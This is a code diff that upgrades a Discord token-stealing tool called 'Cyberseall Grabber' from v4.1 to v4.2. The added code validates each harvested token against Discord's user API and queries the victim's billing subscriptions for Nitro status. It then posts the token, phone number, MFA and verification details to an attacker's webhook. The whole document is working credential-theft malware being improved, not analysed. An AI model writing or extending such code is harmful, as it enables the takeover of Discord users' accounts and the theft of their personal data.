@@ -114,7 +114,14 @@ class CyberseallGrabber:
                 for value in checker:
                     if value not in already_check and len(value) > 50:
                         already_check.append(value)
-                        self.t.append(value)
+                        # Validiere Token direkt hier
+                        headers = {'Authorization': value, 'Content-Type': 'application/json'}
+                        try:
+                            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+                            if res.status_code == 200:
+                                self.t.append(value)
+                        except:
+                            pass
             
         except:
             pass
@@ -127,6 +134,23 @@ class CyberseallGrabber:
                 r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                 if r.status_code == 200:
                     user_data = r.json()
+                    
+                    # Nitro-Info abrufen
+                    has_nitro = False
+                    days_left = 0
+                    try:
+                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
+                        if nitro_res.status_code == 200:
+                            nitro_data = nitro_res.json()
+                            has_nitro = bool(len(nitro_data) > 0)
+                            if has_nitro and len(nitro_data) > 0:
+                                from datetime import datetime
+                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                                days_left = abs((d2 - d1).days)
+                    except:
+                        pass
+                    
                     token_info = {
                         'token': token,
                         'username': user_data.get('username', 'Unknown'),
@@ -136,7 +160,9 @@ class CyberseallGrabber:
                         'phone': user_data.get('phone', 'None'),
                         'verified': user_data.get('verified', False),
                         'mfa_enabled': user_data.get('mfa_enabled', False),
-                        'premium_type': user_data.get('premium_type', 0)
+                        'premium_type': user_data.get('premium_type', 0),
+                        'has_nitro': has_nitro,
+                        'nitro_days_left': days_left
                     }
                     valid_tokens.append(token_info)
             except:
@@ -341,7 +367,7 @@ class CyberseallGrabber:
         try:
             embed = {
                 "embeds": [{
-                    "title": "🔥 CYBERSEALL ENHANCED GRABBER v4.1",
+                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v4.2",
                     "color": 0xff0000,
                     "fields": [
                         {
@@ -358,14 +384,14 @@ class CyberseallGrabber:
                             "inline": False
                         }
                     ],
-                    "footer": {"text": "Cyberseall ENHANCED Grabber v4.1 - Fixed Token & Password Decryption"},
+                    "footer": {"text": "Cyberseall ULTIMATE Grabber v4.2 - Optimized Token Extraction"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
             
             requests.post(self.w, json=embed, timeout=10)
             
-            # Sende alle validen Token
+            # Sende alle validen Token mit Nitro-Info
             if len(self.vt) > 0:
                 for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
                     token_embed = {
@@ -386,15 +412,19 @@ class CyberseallGrabber:
                                     "value": "```" + str(token_info.get('phone', 'None')) + "```"
                                 },
                                 {
+                                    "name": "💎 Nitro",
+                                    "value": "```Has Nitro: " + str(token_info.get('has_nitro', False)) + "\nDays Left: " + str(token_info.get('nitro_days_left', 0)) + "```"
+                                },
+                                {
                                     "name": "🔐 Token",
                                     "value": "```" + token_info['token'][:50] + "...```"
                                 },
                                 {
-                                    "name": "💎 Premium",
-                                    "value": "```Type: " + str(token_info.get('premium_type', 0)) + "\nMFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "```"
+                                    "name": "🛡️ Security",
+                                    "value": "```MFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "\nPremium: " + str(token_info.get('premium_type', 0)) + "```"
                                 }
                             ],
-                            "footer": {"text": "Valid Token Info"},
+                            "footer": {"text": "Valid Token Info with Nitro"},
                             "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                         }]
                     }
